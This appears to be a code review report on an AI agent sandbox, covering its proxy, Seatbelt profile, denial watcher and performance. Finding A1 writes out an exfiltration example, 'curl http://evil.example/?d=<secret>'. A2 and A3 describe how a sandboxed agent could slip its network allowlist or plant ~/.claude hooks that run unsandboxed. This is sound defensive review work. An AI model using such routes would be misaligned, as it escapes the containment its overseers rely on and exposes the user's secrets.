# P292 code review, round 1

Base: `0de2692c4` (`docs: mark P282 done`), last commit of the P281/P282 review session.
Head: `b3821e545`. Scope: 151 commits since base: P283, P284 tail, P285 Parts 2-4, P286, P287, P288,
P289, P290. P291 is not landed and is out of scope (round 2 covers it).

One reviewer, three dimensions: (1) architecture, structure, security; (2) correctness and business
logic; (3) performance and resources. Findings only; no fixes. Groups follow file or root cause so a
fixer can commit per group.

Severity counts: High 1, Medium 5, Low 6.

## Clean areas

Nothing real found in:
- Migrations `0036` (ade_runs rebuild: no table referenced `ade_runs` before it, all three indexes
  recreated), `0037`, gitreview `0004`.
- i18n: every catalog key the diff references exists in `packages/theme/src/i18n/en.json`.
- Return limits (P288): parser, writer round-trip, `LegacyOnFailure`, `decideLoop`, `countReturns`. The
  dropped per-result `max` in old snapshots is a decision the P288 plan records.
- Review step engine (P286) logic: send, round end, fallback, resume, finish, reply grant checks.
- Memory P285 Parts 2-4: `memfmt` v2 parse/format, `ApplyDoc`, `RenderDoc`, distill core, bridge and MCP tool.
  Spend cap failing without partial lines and kept `distilled/` files are plan decisions.
- P289 prompt rewrites and `checkprompts`; P290 site (only `set:html` is the static icon map).
- Frontend: every changed `.vue` is `<script setup lang="ts">`, no `<style>` block; distill and review
  queries go through TanStack Query, listeners dispose via `tryOnScopeDispose`.

## Group A: sandbox network (`internal/agentsandbox/proxy.go`, `profile.go`)

### A1. High. Proxy forwards plain HTTP to any host, without auth

- File: `internal/agentsandbox/proxy.go:69-92`.
- Defect: only `HandleConnectFunc` filters. goproxy v1.7.2 `handleHttp` forwards every non-CONNECT
  request with an absolute URL through `Tr` (`http.ProxyFromEnvironment`). No allowlist and no
  `Proxy-Authorization` check apply. The P287 plan says "CONNECT only".
- Failure: a `network: false` run has `HTTP_PROXY`/`http_proxy` set to the proxy. `curl http://evil.example/?d=<secret>`
  inside the sandbox reaches any host. The no-network promise breaks for plain HTTP.
  Any local process can also use the proxy as an open HTTP relay.
- Fix: register `gp.OnRequest().DoFunc` that returns a 403 `goproxy.NewResponse` for every non-CONNECT
  request, and emit a `network` denial when the token resolves to a run. Optionally drop `HTTP_PROXY`/
  `http_proxy` from `Env` so plain HTTP fails at the sandbox instead. Add a proxy test: plain GET is 403,
  CONNECT to a non-allowlisted host is 403, CONNECT without token is 403.

### A2. Medium. Network-off profile allows every loopback port

- File: `internal/agentsandbox/profile.go:127`; `apps/kira-space/internal/ade/sandbox.go:57`;
  `internal/scriptruns/smart_run.go:125`.
- Defect: `(allow network* (local ip "localhost:*") (remote ip "localhost:*"))` opens all loopback ports.
  `Policy.Ports` only reaches the profile header comment.
- Failure: a local forward proxy (corporate proxy, `HTTPS_PROXY=http://127.0.0.1:...`, an SSH `-D` tunnel)
  or any local service with outbound reach lets a `network: false` agent bypass the allowlist. Not listed in
  `docs/ARCHITECTURE.md` "Known open items".
- Secondary: `Ports` is `b.agent.Port()` / `srv.Port()` read before `Register` starts the listener, so the
  first sandboxed run of a session records port 0.
- Fix: either restrict remote loopback to `Ports` (`(remote ip "localhost:<port>")` per port, plus the
  proxy port) with an explicit opt-in for tests that bind local servers, or record the gap as a known open
  item. If restricting, start the MCP listener before `prepareSandbox` reads the port.

### A3. Medium. `allow` paths reopen protected write areas

- File: `internal/agentsandbox/profile.go:85-121`; `internal/agentsandbox/policy.go:179-194`
  (`extraPaths`); `apps/kira-space/internal/adeflow/parse.go:456`.
- Defect: the `~/.claude` config/hook/extension write denies come before the `allow paths` section, so a
  later allow wins. The keychain directory has a read deny but no write deny. Validation rejects only `/`,
  the `~` spelling of home and paths under `~/Library/Keychains/`; it does not reject home spelled
  absolute (`/Users/me`), `~/.claude`, or ancestors such as `~/Library`.
- Failure: a workflow with `allow: [~/.claude]` or `[/Users/me]` lets the agent write
  `~/.claude/settings.json` hooks, which run unsandboxed in the user's next interactive session. `allow: [~/Library]`
  lets it write `~/Library/Keychains` and `~/Library/LaunchAgents`. A workflow file shared in a repo can
  carry such a block.
- Fix: emit the `~/.claude` protect denies and a `(deny file-write* (subpath H/Library/Keychains))` after the
  `allow paths` and worktree sections (same "protections last" rule as git). In `ResolvePolicy`, reject an
  allow or read path that equals home or is an ancestor of `~/.claude` or the keychain directory after
  `EvalSymlinks`. Extend `testdata/allow_over_common.sb` style goldens with an allow over `~/.claude`.

### A4. Low. Proxy token outlives runs that never start

- File: `internal/agentsandbox/enforcer.go:76-86`, `proxy.go:109`; `apps/kira-space/internal/ade/sandbox.go:165`;
  `internal/scriptruns/smart_run.go`.
- Defect: `Prepare` registers a proxy token; only the `Watch` stop func releases it. `Watch` runs from
  `OnStart`. When `agent.Register`, `WriteUserConfig`, `begin` or process start fails after `Prepare`, the
  token stays in `Proxy.tokens` for the app session.
- Failure: the map grows per failed launch; each leaked token keeps working as proxy auth.
- Fix: add `Release(runID)` to `Enforcer` (no-op in the fake) and call it from `endSandbox` and
  `smartSandbox.cleanup`.

## Group B: sandbox runtime and denial watch (`internal/agentsandbox/watcher.go`, `runtime.go`)

### B1. Medium. System-wide denial stream misattributes and floods the log

- File: `internal/agentsandbox/watcher.go:141`, `:146-176`.
- Defect: the predicate matches every Seatbelt denial on the Mac (App Sandbox apps log the same
  `Sandbox: proc(pid) deny(...)` shape). `attribute` gives a denial from a vanished pid to the only
  watched run. Every unattributed denial logs at Info.
- Failure: with one run live, a short-lived process of another app that hits its own sandbox becomes a
  denial on the run. `BlockedReason` can then name it as the cause of a failed run. While any run is live,
  Kira's log fills with other apps' denials.
- Fix: drop the vanished-pid fallback (or keep it only when the process name matches a process the run
  spawned, e.g. from earlier attributed denials). Log unattributed denials at Debug, or count them.

### B2. Medium. Runtime probe is cached from the first run's context

- File: `internal/agentsandbox/runtime.go:36`; callers `apps/kira-space/internal/ade/sandbox.go:112`,
  `internal/scriptruns/sandbox.go:40`.
- Defect: `DiscoverRuntime` runs once per app session with the first caller's run context and claude
  path. If that run is stopped during the probe (login shell up to 5 s), `ResolveClaude` and the PATH probe
  fail and the reduced `Runtime` is cached.
- Failure: with `ClaudePrefix` and `PathPrefixes` empty, the profile denies reads of a home-installed
  claude and toolchains. Every later sandboxed run fails until restart.
- Fix: probe with `context.Background()` plus its own timeout, and do not cache a probe that failed on
  context cancellation (or retry once per launch when `ClaudePrefix` is empty).

### B3. Low. Watcher gives up for good and never restarts

- File: `internal/agentsandbox/watcher.go:104-131`.
- Defect: `failures` counts every exit of `log stream` over the loop's life and never resets after a
  healthy stream. After the third exit the loop returns but `w.cancel` stays set, so `watch` never starts a
  new loop until all runs end and the 30 s idle stop clears it.
- Failure: a long session with a few `log stream` restarts loses denials for every later run.
- Fix: reset `failures` after a stream that delivered lines or ran past the last backoff. On give-up, clear
  `w.cancel` under `w.mu` so the next `watch` retries.

## Group C: performance (engine and stores)

### C1. Medium. `emitRuns` runs three to four queries per run

- File: `apps/kira-space/internal/ade/reviewstep.go:98-117`; `apps/kira-space/internal/ade/runs.go:195-215`.
- Defect: `wireRun` loads the badge row, every run of the task (`RunsOfTask`), the review row, and all
  review rounds of the task, for each run emitted. `emitRuns` has 20 callers, among them
  `setPendingNote` (many runs at once) and each fresh sandbox denial.
- Failure: a task with many runs makes each emit O(runs) per run, so a batch emit is O(n²) rows read under
  the task mutex.
- Fix: in `emitRuns`, load `RunsOfTask`, badges and review rounds once per task for the batch, then build
  each wire run from those slices. Skip `GetReview`/`ReviewRounds` for runs whose step is not a review step.

### C2. Low. Repeated denials cost a DB write each; hub `seen` map is unbounded

- File: `apps/kira-space/internal/ade/sandbox.go:200-204`; `internal/agentsandbox/enforcer.go:138`.
- Defect: every non-fresh denial runs `UPDATE ade_run_sandbox SET denial_count = denial_count + 1`.
  `hub.seen` keeps every distinct (op, target) of a run; only the tracker caps at `MaxDenials`.
- Failure: a tool looping on a denied path (or a `find` over `/Users`) makes thousands of SQLite writes
  and map entries per run.
- Fix: count in memory (the tracker already holds `total`) and flush the count on a timer or at run end.
  Stop adding keys to `seen` once the run has `MaxDenials` distinct ones (count the rest only).

### C3. Low. Board load reads every review row ever stored

- File: `apps/kira-space/internal/ade/board.go:376`; `apps/kira-space/internal/storage/repos/adetask.go:988`.
- Defect: `Reviews()` selects all of `ade_reviews`, archived tasks included, on every board build;
  only live tasks' rows are used.
- Fix: join on live tasks, like `RunsByLiveTask` (`WHERE run_id IN (SELECT id FROM ade_runs WHERE task_id IN
  (SELECT id FROM ade_tasks WHERE archived_at IS NULL))`).

### C4. Low. `MarkSent` updates and notifies once per comment

- File: `apps/kira-space/internal/gitreview/comments.go:179-187`.
- Defect: one `UPDATE` and one `ReviewChange` notify per comment id.
- Failure: sending N comments fires N repaint events and N comment-list invalidations in each open review
  window.
- Fix: one `UPDATE ... WHERE id IN (...) AND session_id = (...)` and one notify.

## Group D: frontend validation

### D1. Low. Sandbox path check accepts paths the parser rejects

- File: `apps/kira-space/frontend/src/ade/v2/board/stepSandbox.ts:28-30`.
- Defect: `pathsValid` accepts `~`, `/` and `~/Library/Keychains/...`; `adeflow` rejects them on save.
- Failure: the editor shows the field valid, then Save fails with a parser message.
- Fix: mirror the parser rules (and A3's added rules) in `pathsValid`, with the same messages.
